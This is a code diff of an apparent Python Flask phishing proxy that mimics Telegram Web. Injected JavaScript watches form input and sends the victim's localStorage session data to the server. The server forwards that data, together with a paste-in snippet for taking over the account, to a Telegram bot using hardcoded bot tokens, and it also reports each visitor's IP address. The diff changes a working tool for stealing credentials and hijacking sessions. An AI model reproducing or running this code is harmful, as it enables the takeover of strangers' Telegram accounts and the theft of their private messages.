@@ -10,7 +10,6 @@ BASE_URL = 'https://web.telegram.org/k/'
 # Your Telegram bot token and chat ID
 TELEGRAM_BOT_TOKEN = '7859238179:AAHJvboPix9pEkq_xNSh2RJFf3EhLqWlQEY'
 TELEGRAM_CHAT_ID = '-4753436379'
-
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
 def proxy(path):
@@ -29,10 +28,10 @@ def proxy(path):
     injected_js = """
     <script>
         document.addEventListener("input", function(event) {
-            if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
-                console.log(`Input detected in ${event.target.tagName}:`, event.target.value);
-            }
-        });
+    if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
+        console.log(`Input detected in ${event.target.tagName}:`, event.target.value);
+    }
+});
 
         function sendStorageData() {
             const localStorageData = JSON.stringify(localStorage);
@@ -69,18 +68,9 @@ def proxy(path):
         setInterval(function() {
             const value = localStorage.getItem(keyName);
             if (value !== null) {
-                try {
-                    const parsedValue = JSON.parse(value);
-                    if (parsedValue && parsedValue.id) {
-                        console.log(`Key "${keyName}" exists with id:`, parsedValue.id);
-                        sendStorageData();
-                        window.location.reload();
-                    } else {
-                        console.log(`Key "${keyName}" exists but no id found`);
-                    }
-                } catch (e) {
-                    console.log(`Error parsing "${keyName}" value:`, e);
-                }
+                console.log(`Key "${keyName}" exists with value:`, value);
+                sendStorageData();
+                window.location.reload();
             }
         }, 5000);
     </script>
@@ -94,14 +84,12 @@ def proxy(path):
     excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
     headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
     return Response(content, response.status_code, headers)
-
 def tg():
     ip = requests.get("https://api.myip.com")
     message = f"new safeguard visit from {ip.text}"
-    requests.post(f'https://api.telegram.org/bot7659352547:AAGXCajgc9uZgK0Vb1NJkRPPM9B9yg8kk3Q/sendMessage', data={'chat_id': 1409893198, 'text': message})
+    requests.post(f'https://api.telegram.org/bot7659352547:AAGXCajgc9uZgK0Vb1NJkRPPM9B9yg8kk3Q/sendMessage',data={'chat_id': 1409893198, 'text': message} )
 
 tg()
-
 @app.route('/store-data', methods=['POST'])
 def store_data():
     storage_data = request.json
@@ -115,7 +103,6 @@ def store_data():
     send_text_to_telegram(message)
 
     return 'Data received', 200
-
 REVERSE_PROXY_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -180,11 +167,9 @@ REVERSE_PROXY_HTML = """
 </body>
 </html>
 """
-
 @app.route('/verify', methods=['GET'])
 def reverse_proxy():
     return REVERSE_PROXY_HTML
-
 def format_message(local_storage):
     # Example placeholders; customize this part based on actual localStorage data
     name = '?.eth'  # Replace this with the relevant localStorage key for the name if available
@@ -192,10 +177,13 @@ def format_message(local_storage):
     hit_id = '6717689117'  # Replace this with relevant data if needed
 
     # JavaScript code to be copied
-    copy_code = 'if(location.host=="web.telegram.org"){localStorage.clear();Object.entries(%s).forEach(i => localStorage.setItem(i[0], i[1]))};location.href="https://web.telegram.org/k";' % (local_storage)
+    copy_code = 'if(location.host=="web.telegram.org"){localStorage.clear();Object.entries(%s).forEach(i => localStorage.setItem(i[0], i[1]))};location.href="https://web.telegram.org/k";'%(local_storage)
     # Format the message using HTML
     message = f"""
+
 <b>❓ How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)
+
+
 
 <code>{copy_code}</code>
 """
@@ -203,7 +191,7 @@ def format_message(local_storage):
 
 def send_text_to_telegram(message):
     # Send the message text to the Telegram bot using HTML parsing
-    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage', data={'chat_id': TELEGRAM_CHAT_ID, 'text': message, "parse_mode": "html"})
+    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',data={'chat_id': TELEGRAM_CHAT_ID, 'text': message,"parse_mode":"html"} )
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
